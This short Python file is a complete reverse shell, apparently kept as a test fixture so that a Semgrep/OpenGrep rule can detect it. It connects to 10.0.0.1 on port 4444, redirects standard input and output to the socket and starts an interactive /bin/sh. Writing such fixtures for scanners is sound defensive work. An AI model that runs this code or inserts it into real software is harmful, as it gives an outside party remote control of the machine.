import socket
import subprocess
import os

def connect_back():
    # Classic Reverse Shell pattern
    # OpenGrep (via Semgrep rules) will flag this as security.audit.python-reverse-shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    connect_back()
